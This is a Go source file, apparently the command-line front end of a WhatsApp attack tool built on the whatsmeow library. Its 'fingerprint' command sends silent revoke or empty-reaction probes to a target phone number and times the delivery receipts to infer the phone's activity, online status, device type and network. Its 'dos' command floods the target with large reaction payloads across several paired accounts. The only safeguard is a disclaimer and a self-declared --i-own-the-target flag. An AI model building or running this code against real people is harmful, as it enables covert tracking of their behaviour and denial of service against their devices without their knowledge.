package main

import (
	"context"
	"errors"
	"flag"
	"fmt"
	"io"
	"log"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"github.com/mdp/qrterminal/v3"
	waLog "go.mau.fi/whatsmeow/util/log"

	"github.com/ctrlsam/careless-whisper-go/internal/exporter"
	"github.com/ctrlsam/careless-whisper-go/internal/flood"
	"github.com/ctrlsam/careless-whisper-go/internal/messenger"
	"github.com/ctrlsam/careless-whisper-go/internal/messenger/whatsapp"
	"github.com/ctrlsam/careless-whisper-go/internal/metrics"
	"github.com/ctrlsam/careless-whisper-go/internal/model"
	"github.com/ctrlsam/careless-whisper-go/internal/runner"
)

const disclaimerText = "RESEARCH USE ONLY. This tool sends real messages to a real phone number. " +
	"Only run it against devices and phone numbers you own or are explicitly authorised to test. " +
	"Unauthorised use may be illegal. Confirm ownership with --i-own-the-target."

func printDisclaimer() {
	fmt.Fprintln(os.Stderr, "============================================================")
	fmt.Fprintln(os.Stderr, disclaimerText)
	fmt.Fprintln(os.Stderr, "============================================================")
}

// requireConsent enforces the ownership acknowledgement gate.
func requireConsent(consent bool) error {
	printDisclaimer()
	if !consent {
		return errors.New("refusing to run a live tool without --i-own-the-target; " +
			"only use this against devices and phone numbers you own or are authorised to test")
	}
	return nil
}

func buildMessenger(provider, sessionPath string, pairTimeout time.Duration, pairPhone string) (messenger.Messenger, error) {
	switch provider {
	case "whatsapp":
		opts := []whatsapp.Option{
			whatsapp.WithSessionPath(sessionPath),
			whatsapp.WithConnectTimeout(pairTimeout),
			whatsapp.WithLogger(waLog.Stdout("WhatsApp", "ERROR", true)),
		}
		if pairPhone != "" {
			opts = append(opts,
				whatsapp.WithPhonePairing(pairPhone),
				whatsapp.WithPairCodeHandler(func(code string) {
					fmt.Fprintf(os.Stderr, "On the WhatsApp number you are linking, open Linked devices -> Link a device -> Link with phone number instead, and enter: %s\n", code)
				}),
			)
		} else {
			opts = append(opts, whatsapp.WithQRHandler(func(code string) {
				fmt.Fprintln(os.Stderr, "Scan this QR code with WhatsApp (Linked devices) to pair the research account:")
				qrterminal.GenerateHalfBlock(code, qrterminal.L, os.Stderr)
			}))
		}
		return whatsapp.New(opts...), nil
	default:
		return nil, fmt.Errorf("unsupported provider %q (only whatsapp is implemented)", provider)
	}
}

// buildFloodMessenger builds the messenger for the flood tool. With more than
// one account it returns a Pool that fans sends across several separate
// WhatsApp accounts, working around whatsmeow's per-client global send lock
// without the own-device sync overhead of linking many devices to one account.
func buildFloodMessenger(provider, sessionPath string, accounts int, pairTimeout time.Duration, pairPhones []string) (messenger.Messenger, error) {
	if provider != "whatsapp" {
		return nil, fmt.Errorf("unsupported provider %q (only whatsapp is implemented)", provider)
	}
	if accounts <= 1 {
		single := ""
		if len(pairPhones) > 0 {
			single = pairPhones[0]
		}
		return buildMessenger(provider, sessionPath, pairTimeout, single)
	}
	qr := func(account int, code string) {
		fmt.Fprintf(os.Stderr, "Scan QR for account %d of %d - use a DIFFERENT WhatsApp number for each:\n", account+1, accounts)
		qrterminal.GenerateHalfBlock(code, qrterminal.L, os.Stderr)
	}
	pairCode := func(account int, code string) {
		fmt.Fprintf(os.Stderr, "Account %d of %d: on that WhatsApp number open Linked devices -> Link a device -> Link with phone number instead, and enter: %s\n", account+1, accounts, code)
	}
	status := func(account int, message string) {
		log.Printf("account %d: %s", account+1, message)
	}
	return whatsapp.NewPool(whatsapp.PoolConfig{
		Size:        accounts,
		BasePath:    sessionPath,
		QR:          qr,
		PairPhones:  pairPhones,
		PairCode:    pairCode,
		Status:      status,
		PairTimeout: pairTimeout,
		Logger:      waLog.Stdout("WhatsApp", "ERROR", true),
	}), nil
}

// parseProbeKind validates the --probe-kind value against the supported silent
// probe primitives.
func parseProbeKind(value string) (messenger.ProbeKind, error) {
	switch kind := messenger.ProbeKind(strings.TrimSpace(value)); kind {
	case messenger.ProbeRevoke, messenger.ProbeEmptyReaction, messenger.ProbeReaction:
		return kind, nil
	default:
		return "", fmt.Errorf("invalid --probe-kind %q (want revoke, empty-reaction, or reaction)", value)
	}
}

// splitPairPhones parses the comma-separated --pair-phones value into a
// per-account slice, trimming whitespace and preserving empty entries so an
// account can be left on QR pairing by position.
func splitPairPhones(value string) []string {
	if strings.TrimSpace(value) == "" {
		return nil
	}
	parts := strings.Split(value, ",")
	for i := range parts {
		parts[i] = strings.TrimSpace(parts[i])
	}
	return parts
}

// signalContext cancels when the process receives SIGINT or SIGTERM.
func signalContext() (context.Context, context.CancelFunc) {
	return signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
}

type consoleLogger struct{}

func (consoleLogger) OnReport(report model.ReceiptReport) {
	log.Printf("report: %.2fms RTT for %s (msg %s)", report.DelayMillis(), report.PhoneNumber, report.MessageID)
}

func (consoleLogger) OnAnalysis(analysis model.Analysis) {
	net := "n/a"
	if analysis.AccessNetwork != nil {
		net = analysis.AccessNetwork.Type
		if analysis.AccessNetwork.TransitionDetected {
			net += "*" // baseline step-change flagged; see access_network in the export
		}
	}
	log.Printf("analysis: phone=%s app=%s online=%s device=%s net=%s avg_rtt=%.1fms jitter=%.1fms samples=%d",
		analysis.PhoneState, analysis.AppState, analysis.OnlineStatus,
		analysis.DeviceType, net, analysis.AverageRTTMillis, analysis.StdDevRTTMillis, analysis.TotalRequests)
}

func (consoleLogger) Info(message string) { log.Printf("info: %s", message) }
func (consoleLogger) Warn(message string) { log.Printf("warning: %s", message) }

func fingerprintCommand(args []string, _ io.Writer) error {
	flags := flag.NewFlagSet("fingerprint", flag.ContinueOnError)
	flags.SetOutput(io.Discard)
	phoneNumber := flags.String("phone-number", "", "target phone number for fingerprinting")
	provider := flags.String("provider", "whatsapp", "messenger provider to use")
	delay := flags.Duration("delay", time.Second, "delay between requests per worker")
	concurrent := flags.Int("concurrent", 5, "number of concurrent requests")
	exporterName := flags.String("exporter", "", "exporter for results and analysis: jsonl or csv")
	exportDir := flags.String("export-dir", "exports", "directory for exported files")
	enableMetrics := flags.Bool("metrics", false, "enable the Prometheus metrics server")
	metricsPort := flags.Int("metrics-port", 8000, "port for the Prometheus metrics server")
	sessionPath := flags.String("session-path", whatsapp.DefaultSessionPath, "WhatsApp session store path")
	pairTimeout := flags.Duration("pair-timeout", 5*time.Minute, "how long to keep refreshing the QR code while waiting for a scan")
	pairPhone := flags.String("pair-phone", "", "link by phone-number code instead of QR; value is the research account's own number")
	ignoreUnregistered := flags.Bool("ignore-unregistered", false, "ignore unregistered-number warning")
	probeKind := flags.String("probe-kind", "revoke", "silent probe primitive: revoke, empty-reaction, or reaction (reaction is visible on the target)")
	consent := flags.Bool("i-own-the-target", false, "confirm you own or are authorised to test the target")
	if err := flags.Parse(args); err != nil {
		return err
	}
	if err := requireConsent(*consent); err != nil {
		return err
	}
	if *phoneNumber == "" {
		return errors.New("--phone-number is required")
	}
	kind, err := parseProbeKind(*probeKind)
	if err != nil {
		return err
	}

	m, err := buildMessenger(*provider, *sessionPath, *pairTimeout, *pairPhone)
	if err != nil {
		return err
	}

	var exp exporter.Exporter
	if *exporterName != "" {
		exp, err = exporter.NewFileExporter(*exporterName, *exportDir, *phoneNumber)
		if err != nil {
			return err
		}
	}

	observer := newMetricsObserver(*phoneNumber, *enableMetrics)
	if observer.server != nil {
		if err := observer.server.Start(*metricsPort); err != nil {
			return fmt.Errorf("start metrics server: %w", err)
		}
		log.Printf("metrics server listening on :%d/metrics", *metricsPort)
		defer func() { _ = observer.server.Stop(context.Background()) }()
	}

	ctx, cancel := signalContext()
	defer cancel()

	if err := m.Start(ctx); err != nil {
		return fmt.Errorf("start messenger: %w", err)
	}
	defer func() { _ = m.Stop(context.Background()) }()

	log.Printf("waiting for %s to be ready...", *provider)
	if err := m.WaitUntilReady(ctx); err != nil {
		return err
	}
	log.Printf("connected. fingerprinting %s (Ctrl+C to stop)", *phoneNumber)

	err = runner.Run(ctx, m, runner.Settings{
		PhoneNumber:        *phoneNumber,
		ConcurrentWorkers:  *concurrent,
		DelayBetween:       *delay,
		IgnoreUnregistered: *ignoreUnregistered,
		ProbeKind:          kind,
	}, exp, observer)
	if errors.Is(err, context.Canceled) {
		return nil
	}
	return err
}

// metricsObserver forwards analysis to both the console and the metrics server.
type metricsObserver struct {
	consoleLogger
	server *metrics.Server
}

func newMetricsObserver(phoneNumber string, enabled bool) *metricsObserver {
	observer := &metricsObserver{}
	if enabled {
		observer.server = metrics.NewServer(phoneNumber)
	}
	return observer
}

func (o *metricsObserver) OnAnalysis(analysis model.Analysis) {
	o.consoleLogger.OnAnalysis(analysis)
	if o.server != nil {
		o.server.Update(analysis)
	}
}

type floodReporter struct{}

func (floodReporter) Progress(stats flood.Stats, payloadSize int) {
	log.Printf("flood: %d sent, %d failed, %.1f msg/s, ~%.3f GiB est. on target",
		stats.Sent, stats.Failed, stats.Rate(), stats.EstimatedGiB(payloadSize))
}

func (floodReporter) Warn(message string) { log.Printf("warning: %s", message) }
func (floodReporter) Info(message string) { log.Printf("info: %s", message) }

func dosCommand(args []string, _ io.Writer) error {
	flags := flag.NewFlagSet("dos", flag.ContinueOnError)
	flags.SetOutput(io.Discard)
	phoneNumber := flags.String("phone-number", "", "target phone number to flood")
	provider := flags.String("provider", "whatsapp", "messenger provider to use")
	concurrent := flags.Int("concurrent", 10, "number of concurrent flood workers")
	delay := flags.Duration("delay", 0, "delay between messages per worker")
	duration := flags.Duration("duration", 0, "stop after this long (default: run until interrupted)")
	maxMessages := flags.Int("max-messages", 0, "stop after sending this many messages (default: unlimited)")
	payloadSize := flags.Int("payload-size", flood.DefaultPayloadSize, "size in bytes of each reaction payload")
	reportInterval := flags.Duration("report-interval", 5*time.Second, "how often to log flood progress")
	noAck := flags.Bool("no-ack", false, "do not wait for the per-message server ack (higher throughput, no send confirmation)")
	accounts := flags.Int("accounts", 1, "number of separate WhatsApp accounts (distinct numbers) to fan sends across; works around the per-client send lock without own-device sync overhead")
	sessionPath := flags.String("session-path", whatsapp.DefaultSessionPath, "WhatsApp session store path (per-account files are suffixed -0, -1, ... when accounts > 1)")
	pairTimeout := flags.Duration("pair-timeout", 5*time.Minute, "per-account window to keep refreshing the QR code while waiting for a scan")
	pairPhones := flags.String("pair-phones", "", "comma-separated per-account numbers to link by phone-number code instead of QR; one entry per account in order, leave an entry empty to keep that account on QR")
	ignoreUnregistered := flags.Bool("ignore-unregistered", false, "ignore unregistered-number warning")
	consent := flags.Bool("i-own-the-target", false, "confirm you own or are authorised to test the target")
	if err := flags.Parse(args); err != nil {
		return err
	}
	if err := requireConsent(*consent); err != nil {
		return err
	}
	if *phoneNumber == "" {
		return errors.New("--phone-number is required")
	}

	m, err := buildFloodMessenger(*provider, *sessionPath, *accounts, *pairTimeout, splitPairPhones(*pairPhones))
	if err != nil {
		return err
	}

	ctx, cancel := signalContext()
	defer cancel()

	if *accounts > 1 {
		log.Printf("pairing %d accounts; scan each QR with a different WhatsApp number in turn", *accounts)
	}
	if err := m.Start(ctx); err != nil {
		return fmt.Errorf("start messenger: %w", err)
	}
	defer func() { _ = m.Stop(context.Background()) }()

	log.Printf("waiting for %s to be ready...", *provider)
	if err := m.WaitUntilReady(ctx); err != nil {
		return err
	}
	log.Printf("connected. flooding %s with %d workers across %d account(s) (%.2f MiB payload). Ctrl+C to stop",
		*phoneNumber, *concurrent, *accounts, float64(*payloadSize)/(1024*1024))

	stats, err := flood.Run(ctx, m, flood.Settings{
		PhoneNumber:        *phoneNumber,
		ConcurrentWorkers:  *concurrent,
		DelayBetween:       *delay,
		Duration:           *duration,
		MaxMessages:        *maxMessages,
		PayloadSize:        *payloadSize,
		ReportInterval:     *reportInterval,
		IgnoreUnregistered: *ignoreUnregistered,
		NoAck:              *noAck,
	}, floodReporter{})
	if err != nil && !errors.Is(err, context.Canceled) {
		return err
	}
	log.Printf("flood finished: %d sent, %d failed over %s (%.1f msg/s, ~%.3f GiB est.)",
		stats.Sent, stats.Failed, stats.Elapsed.Round(time.Millisecond), stats.Rate(),
		stats.EstimatedGiB(*payloadSize))
	return nil
}
